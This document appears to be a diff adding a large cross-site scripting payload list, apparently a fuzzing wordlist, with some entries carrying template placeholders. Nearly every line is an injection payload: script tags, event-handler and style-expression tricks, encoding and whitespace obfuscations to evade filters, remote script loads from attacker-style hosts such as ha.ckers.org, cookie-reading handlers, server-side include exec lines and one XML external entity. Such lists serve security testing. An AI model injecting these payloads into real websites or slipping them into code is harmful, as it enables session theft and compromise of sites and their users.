+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+¼script¾alert(¢XSS¢)¼/script¾
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<div style="font-family:foo}color=red;">XXX
+<BR SIZE="&{javascript:alert(1)}">
+<script>/* *\x00/javascript:alert(1)// */</script>
+--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
+<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+<;XML SRC=";http://ha.ckers.org/xsstest.xml"; ID=I>;<;/XML>;
+<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
+<img src=x onerror=\x10"javascript:alert(1)">
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<script x> alert(1) </script 1=2
+"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
+<;LINK REL=";stylesheet"; HREF=";http://ha.ckers.org/xss.css";>;
+<IMG SRC=x onsubmit="alert(String.fromCharCode(88,83,83))">
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
+src="http://www.site.com/XSS.js"></script>
+<body onload="document.vulnerable=true;">
+<script\x09type="text/javascript">javascript:alert(1);</script>
+<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<script\x0D>javascript:alert(1)</script>
+exp/*<;XSS STYLE=';no\xss:noxss(";*//*";);
+&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+<IMG SRC=x onchange="alert(String.fromCharCode(88,83,83))">
+<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
+<DIV STYLE="width:expression(javascript:alert(1));">
+<svg/onload​=alert/&#42;&#42;/(4)>
+%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
+<IMG SRC="jav ascript:alert('XSS');">
+<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
+<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
+<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<TD BACKGROUND="javascript:alert('XSS')">
+//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
+&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<script\x2F>javascript:alert(1)</script>
+"`'><script>\xE2\x80\x81javascript:alert(1)</script>
+<DIV STYLE="width: expression(alert('XSS'));">
+<img src/onerror=prompt(8)>
+<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
+'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
+"`'><script>\x20javascript:alert(1)</script>
+<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
+&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;
+<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+</script><script>alert(1)</script>
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+<IMG SRC="javascript:alert('XSS');">
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<<SCRIPT>alert(“XSS”);//<</SCRIPT>
+<input onfocus=write(XSS) autofocus>
+<IMG SRC=x ononline="alert(String.fromCharCode(88,83,83))">
+<IFRAME SRC="javascript:document.vulnerable=true;"></iframe>
+<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
+<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
+&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
+<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
+<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
+<script>alert('XSS');</script>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
+`"'><img src='#\x27 onerror=javascript:alert(1)>
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
+</textarea><script>alert(/xss/)</script>
+<meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet">
+<sCR<script>iPt>alert(1)</SCr</script>IPt>
+<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+</scrip</script>t><img src =q onerror=prompt(8)>
+<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<!--<img src="--><img src=x onerror=alert(XSS)//">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+'>"><script src = 'http://www.site.com/XSS.js'></script>
+<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
+<plaintext onfocus=alert(1) autofocus tabindex=1>	
+<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG SRC=x onscroll="alert(String.fromCharCode(88,83,83))">
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<frameset onload=javascript:alert(1)>
+&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
+<IMG SRC=x oncut="alert(String.fromCharCode(88,83,83))">
+<img src ?itworksonchrome?\/onerror = alert(1)
+<script>javascript:alert(1)</script>
+<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">
+<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
+<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
+<svg/onload=alert(1)
+<XSS STYLE="xss:expression(alert('XSS'))">
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+"-eval("window['pro'%2B'mpt'](8)")-"
+<;EMBED SRC=";http://ha.ckers.org/xss.swf"; AllowScriptAccess=";always";>;<;/EMBED>;
+<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
+\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
+&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
+perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out
+&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>
+&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
+[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<IMG SRC=x oncuechange="alert(String.fromCharCode(88,83,83))">
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+<div style=content:url(%(svg)s)></div>
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+<iframe/src \/\/onload = prompt(1)
+%3cscript%3ealert('XSS')%3c/script%3e
+&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;
+<video controls src=1 onfocus=alert(1) autofocus>	
+<a href="jav&#97ascript:javascript:alert(1)">test1</a>
+<script itworksinallbrowsers>/*<script* */alert(1)</script
+<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
+"`'><script>\xE2\x80\x82javascript:alert(1)</script>
+<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
+window.alert("Bonjour !");
+"`'><script>\x0Ajavascript:alert(1)</script>
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+<object onError object onError="javascript:javascript:alert(1)"></object onError>
+"`'><script>\xC2\xA0javascript:alert(1)</script>
+perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out
+<iframe src="javascript:alert('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee>
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<~/XSS STYLE=xss:expression(alert('XSS'))>
+<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<object onError object onError="javascript:javascript:alert(1)"></object onError>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
+<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<;!--#exec cmd=";/bin/echo ';<;SCRIPT SRC';";-->;<;!--#exec cmd=";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';";-->;
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;
+"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
+<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
+<IMG SRC="javascript:alert('XSS')"
+<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>
+<script\x0Ctype="text/javascript">javascript:alert(1);</script>
+</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
+<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+"><script>alert(0)</script>
+<ul onfocus=alert(1) autofocus tabindex=1>	
+'`"><\x00script>javascript:alert(1)</script>
+<body onload body onload="javascript:javascript:alert(1)"></body onload>
+<A HREF="http://66.102.7.147/">XSS</A>
+<IMG SRC=x onplay="alert(String.fromCharCode(88,83,83))">
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<IMG DYNSRC="javascript:alert('XSS')">
+<style onreadystatechange=javascript:javascript:alert(1);></style>
+<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
+<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+ <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+"`'><script>\xE2\x80\x81javascript:alert(1)</script>
+<IMG DYNSRC="javascript:alert('XSS')">
+<;TABLE BACKGROUND=";javascript:alert(';XSS';)";>;<;/TABLE>;
+&#x000003C
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
+<img src=x\x10onerror="javascript:alert(1)">
+&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+<iframe src="vbscript:document.vulnerable=true;">
+<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<IMG SRC="javascript:alert('XSS');">
+<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
+"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
+&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+<DIV+STYLE="background-image: url(javascript:alert(1))">
+http://www.google<script .com>alert(document.location)</script
+<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
+</title><SCRIPT>document.vulnerable=true;</script>
+<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
+&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
+"onclick=prompt(8)>"@x.y
+<image2 onfocus=alert(1) autofocus tabindex=1>	
+<marquee><script>alert('XSS')</script></marquee>
+<;IMG SRC=";jav&;#x0A;ascript:alert(';XSS';);";>;
+"><img src=x onerror=javascript:alert("1")>
+&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;
+';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\";alert(String&#46;fromCharCode(88,83,83))//\\";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>
+"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
+"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<DIV STYLE="width: expression(alert('XSS'));">
+"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
+<IMG SRC=x onpaste="alert(String.fromCharCode(88,83,83))">
+"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
+&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
+<x style="background:url('x&#1;;color:red;/*')">XXX</x>
+'`"><\x3Cscript>javascript:alert(1)</script>        
+<IMG SRC=x onloadedmetadata="alert(String.fromCharCode(88,83,83))">
+<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<svg/onload=alert(1)
+<img src\x09=x onerror="javascript:alert(1)">
+<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
+<img \x11src=x onerror="javascript:alert(1)">
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
+<div STYLE="width: expression(document.vulnerable=true);">
+<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"
+<XML ID=I><X><C><![<IMG SRC="javas]]<![cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>
+&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt;
+<script ^__^>alert(String.fromCharCode(49))</script ^__^
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
+&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
+<BODY ONLOAD=javascript:javascript:alert(1)>
+&#x000003C;
+"aaa&#x3C;a href=javas&#x26;#99;ript:alert(1)&#x3E;click"
+<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
+<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
+<iframe/onreadystatechange=alert(1)
+<IMG SRC=x onended="alert(String.fromCharCode(88,83,83))">
+"`'><script>\x0Cjavascript:alert(1)</script>
+&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;
+&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
+&lt;!&#91;endif&#93;--&gt;
+<img src="/" =_=" title="onerror='prompt(1)'">
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<style type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</style>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<img SRC=" &#14; javascript:document.vulnerable=true;">
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+"><img src=x onerror=javascript:alert(`A`)>
+"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
+<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
+<a href="jav&#97ascript:javascript:alert(1)">test1</a>
+&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;
+<br SIZE="&{document.vulnerable=true}">
+&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-
+‘)alert(1);//
+&lt;HTML&gt;&lt;BODY&gt;
+"><h1><IFRAME width="420" height="315" SRC="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" onmouseover="alert(document.cookie)"></IFRAME>123</h1>
+&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
+<body onhashchange="print()">	
+<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
+<style>@import'http://www.securitycompass.com/xss.css';</style>
+<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
+<embed type="image" src=%(scriptlet)s></embed>
+<svg/onload=parent[/al/.source.concat(/ert/.source)] (2)>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<XSS STYLE="behavior: url(%(htc)s);">
+<script x> alert(1) </script 1=2
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+<iframe/src \/\/onload = prompt(1)
+ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<x style="behavior:url(%(sct)s)">
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<iframe/onreadystatechange=alert(1)
+&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
+<LAYER SRC="%(scriptlet)s"></LAYER>
+<input onfocus=javascript:alert(1) autofocus>
+</script><script>alert('XSS');</script>
+<<​script>script>prompt()<​/script>
+<script src="data:\xD4\x8F,javascript:alert(1)"></script>
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+&#X003c;
+<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<script\x09type="text/javascript">javascript:alert(1);</script>
+<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<style>@import'http://www.securitycompass.com/xss.css';</style>
+ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
+&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;
+"`'><script>\xE2\x80\x87javascript:alert(1)</script>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+&lt;? echo(&apos;&lt;SCR)&apos;;
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
+&#x3C;
+<script/src=data:,alert()>
+<IMG SRC=javascrscriptipt:alert('XSS')>
+ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
+<iframe src=http://ha.ckers.org/scriptlet.html <
+perl -e ';print ";<;IM SRC=java\0script:alert(";XSS";)>";;';>; out
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
+&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;
+&#x03c
+<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
+\";alert('XSS');//
+<style TYPE="text/javascript">document.vulnerable=true;</style>
+<img SRC="javascript:document.vulnerable=true;"
+`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
+</ foo="><script>javascript:alert(1)</script>">
+<script language='javascript' src='%(jscript)s'></script>
+<img src=x onerror=\x09"javascript:alert(1)">
+//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
+<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
+<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
+<script src="data:\xCB\x8F,javascript:alert(1)"></script>
+[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
+<EMBED SRC="http://hacker.com/xss.swf" AllowScriptAccess="always">
+<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
